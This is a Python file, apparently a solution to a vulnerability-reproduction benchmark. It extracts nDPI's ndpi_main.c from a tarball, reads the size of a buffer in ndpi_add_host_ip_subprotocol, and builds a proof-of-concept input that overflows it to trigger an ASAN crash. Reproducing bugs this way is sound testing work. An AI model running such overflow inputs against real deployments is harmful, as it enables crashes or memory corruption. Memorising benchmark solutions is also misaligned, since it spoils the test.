import tarfile
import re

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Default overflow length derived from ground-truth (56 bytes total)
        # Prefix "1.1.1.1 tcp " is 12 bytes, leaving 44 bytes for overflow.
        overflow_len = 44
        
        try:
            with tarfile.open(src_path) as tar:
                # Find ndpi_main.c source file
                c_member = None
                for member in tar:
                    if member.name.endswith('ndpi_main.c'):
                        c_member = member
                        break
                
                if c_member:
                    f = tar.extractfile(c_member)
                    content = f.read().decode('utf-8', errors='ignore')
                    
                    # Locate the vulnerable function
                    func_idx = content.find("ndpi_add_host_ip_subprotocol")
                    if func_idx != -1:
                        # Find buffer size of 'tail' variable
                        # Search window limited to avoid false positives
                        search_window = content[func_idx:func_idx+3000]
                        match = re.search(r'char\s+tail\s*\[\s*(\d+)\s*\]', search_window)
                        if match:
                            buf_size = int(match.group(1))
                            # Ensure payload is large enough to overflow
                            # We need to write past the buffer bounds to trigger ASAN
                            if buf_size + 8 > overflow_len:
                                overflow_len = buf_size + 8
        except Exception:
            pass
            
        # Generate PoC: IP Protocol Overflow
        # The vulnerability is in parsing the third token into the 'tail' buffer
        prefix = b"1.1.1.1 tcp "
        return prefix + b"A" * overflow_len